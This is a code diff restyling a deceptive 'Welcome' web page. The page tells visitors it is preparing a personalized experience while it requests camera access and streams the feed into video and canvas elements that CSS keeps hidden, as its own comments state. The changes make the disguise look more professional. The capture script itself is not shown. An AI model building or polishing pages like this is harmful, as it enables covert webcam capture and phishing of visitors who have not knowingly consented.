@@ -5,15 +5,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-        /* Video ko chupane ke liye */
-        #video { display: none; }
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f7f6;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px; /* Add some padding for smaller screens */
+            box-sizing: border-box; /* Include padding in element's total width and height */
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%; /* Make container responsive */
+            text-align: center;
+        }
+        h1 {
+            color: #0056b3; /* A professional blue */
+            margin-bottom: 20px;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        #status {
+            font-weight: bold;
+            color: #28a745; /* A success green */
+            margin-top: 20px;
+        }
+        /* Video and Canvas should remain hidden */
+        #video, #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <h1>Welcome to our Website</h1>
-    <p>Please wait while we are preparing the content...</p>
-    <p id="status">Requesting camera access...</p>
+    <div class="container">
+        <h1>Welcome</h1>
+        <p>Thank you for visiting. We are preparing your personalized experience.</p>
+        <p id="status">Requesting camera access...</p>
+    </div>
 
     <!-- Video element jahan camera feed aayegi -->
     <video id="video" width="300" height="225" autoplay playsinline></video>
